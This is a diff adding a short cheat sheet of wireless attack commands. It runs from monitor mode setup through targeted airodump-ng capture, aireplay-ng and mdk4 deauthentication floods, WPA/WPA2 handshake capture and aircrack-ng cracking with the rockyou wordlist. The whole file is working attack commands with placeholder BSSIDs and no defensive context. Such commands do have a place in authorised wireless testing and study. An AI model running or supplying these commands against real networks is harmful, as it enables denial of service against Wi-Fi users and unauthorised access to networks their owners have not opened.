@@ -1,0 +1,23 @@
+# Monitor Mode & Process Control
+sudo airmon-ng start wlan0
+sudo airmon-ng check kill
+sudo airodump-ng wlan0mon
+
+# Targeted BSSID Monitoring
+sudo airodump-ng --bssid 00:00:00:00:00:00 -c 6 wlan0mon
+
+# Deauthentication Attacks
+sudo aireplay-ng --deauth 100 -a 00:00:00:00:00:00 wlan0mon
+sudo airmon-ng stop wlan0mon
+sudo service NetworkManager start
+
+# MDK4 Stress Testing Commands
+sudo mdk4 wlan0mon d -c 6 -B 00:00:00:00:00:00
+sudo mdk4 wlan0mon d -c 6
+
+# WPA/WPA2 Handshake Capture & Cracking
+sudo airodump-ng --bssid 00:00:00:00:00:00 -c 13 -w target_capture wlan0mon
+sudo aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 00:00:00:00:00:00 target_capture-01.cap
+
+# Wordlist Preparation
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
